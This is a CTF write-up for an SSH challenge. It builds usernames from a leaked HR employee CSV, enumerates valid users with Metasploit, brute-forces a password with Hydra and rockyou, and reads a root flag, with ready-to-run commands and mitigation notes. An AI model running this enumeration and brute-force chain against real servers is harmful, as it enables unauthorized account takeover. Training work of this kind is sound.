# HR Database Breach - CTF Challenge Writeup

## Challenge Overview

**Difficulty:** Medium  
**Category:** Misc (Exploitation, Data Analysis)
**Points:** 500

### Challenge Description
After breaching the HR office, our hackers got their hands on a sensitive CSV database containing detailed records of all company employees: full names, email addresses, phone numbers, and more.

Your mission is to dig into this leaked data, identify a way in, and breach the main company server. The database might contain just what you need, if you know how to look.

**SSH Target:** `ssh <username>@ghctf.microclub.info -p 13502`

---

## Solution Walkthrough

This challenge requires a systematic approach combining data analysis, vulnerability research, and exploitation techniques. Here's how to solve it step by step:

### Step 1: Analyzing the Employee Database

First, examine the provided CSV file containing 1000 employee records with the following structure:
```
firstName,lastName,email,phoneNumber,department,address,salary,hireDate
```

The key insight is to focus on employees who would likely have system access - the IT department.

**Filter for IT Department Members:**
```bash
# Using grep to filter IT department employees
grep -i "IT" employees.csv > it_employees.csv

# Or using Python/pandas for more complex filtering
python3 -c "
import pandas as pd
df = pd.read_csv('employees.csv')
it_dept = df[df['department'].str.contains('IT', case=False, na=False)]
print(it_dept)
"
```

### Step 2: SSH Service Analysis

Next, investigate the SSH service running on the target server.

**Enumerate SSH Service:**
```bash
# Check SSH version and configuration
nmap -sV -p 13502 ghctf.microclub.info

# More detailed SSH enumeration
ssh-audit ghctf.microclub.info -p 13502
```

**Key Finding:** The SSH server is running **OpenSSH 7.7**, which is vulnerable to username enumeration attacks through timing-based side channels.

### Step 3: Username List Generation

From the IT department employee data, generate potential usernames using common naming conventions:

**Common Username Patterns:**
- `firstname` (e.g., `john`)
- `lastname` (e.g., `smith`)
- `firstname_lastname` (e.g., `john_smith`)
- `firstinitial + lastname` (e.g., `jsmith`)
- `firstname + lastinitial` (e.g., `johns`)

**Generate Username List:**
```bash
# Create usernames from IT employees (all lowercase)
python3 generate_usernames.py it_employees.csv > usernames.txt
```

Example Python script:
```python
import csv
import sys

def generate_usernames(csv_file):
    usernames = []
    with open(csv_file, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            first = row['firstName'].lower()
            last = row['lastName'].lower()
            
            usernames.extend([
                first,
                last,
                f"{first}.{last}",
                f"{first[0]}{last}",
                f"{first}{last[0]}"
            ])
    
    return list(set(usernames))  # Remove duplicates

if __name__ == "__main__":
    usernames = generate_usernames(sys.argv[1])
    for username in usernames:
        print(username)
```

### Step 4: SSH Username Enumeration

Use Metasploit's SSH username enumeration module to exploit the timing vulnerability:

**Launch Metasploit:**
```bash
msfconsole
```

**Configure the enumeration module:**
```
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS ghctf.microclub.info
set RPORT 13502
set USER_FILE usernames.txt
set THREADS 10
run
```

**Result:** The enumeration reveals that the username `kristin` exists on the system.

### Step 5: Cross-Reference with Employee Data

Check the IT department employees to identify who "kristin" is:
- Look for employees with first name "Kristine" in the IT department
- **Discovery:** Kristin is the most recently hired IT department member

### Step 6: Password Brute Force Attack

Now that we have a valid username, attempt to brute force the password:

**Using Hydra:**
```bash
hydra -l kristin -P /usr/share/wordlists/rockyou.txt \
      ghctf.microclub.info -s 13502 ssh -t 4 -V
```

**Using Metasploit:**
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS ghctf.microclub.info
set RPORT 13502
set USERNAME kristin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run
```

**Result:** The password `thalia` is found at line 2025 of the rockyou wordlist (a reference to GHCTF 2025 edition).

### Step 7: SSH Access and Flag Retrieval

**Establish SSH Connection:**
```bash
ssh kristin@ghctf.microclub.info -p 13502
# Password: thalia
```

**System Exploration:**
```bash
# Check current user and permissions
whoami
id

# Explore the file system
ls -la /
ls -la /home
ls -la /root
```

**Flag Retrieval:**
```bash
# The flag is located in /root/flag.txt
cat /root/flag.txt
```

---

## Key Learning Points

1. **Data Analysis**: Always analyze provided data files thoroughly - they often contain crucial information for the next steps.

2. **Service Enumeration**: Identifying specific software versions can reveal known vulnerabilities.

3. **Username Generation**: Understanding common naming conventions is crucial for username enumeration attacks.

4. **Timing Attacks**: OpenSSH 7.7 and earlier versions are vulnerable to timing-based username enumeration.

5. **Password Security**: Even in 2025, weak passwords from common wordlists remain a significant security risk.

## Tools Used

- **Data Analysis**: Python, pandas, grep
- **Network Enumeration**: nmap, ssh-audit
- **Exploitation**: Metasploit Framework
- **Password Attacks**: Hydra, Metasploit
- **System Access**: SSH client

## Mitigation Strategies

- **For SSH**: Upgrade to OpenSSH 8.0+ to mitigate timing-based username enumeration
- **For Passwords**: Implement strong password policies and multi-factor authentication
- **For Data Protection**: Encrypt sensitive databases and implement proper access controls
- **For User Management**: Regular audits of user accounts and permissions

**written by : Abderrahmane and Mounir **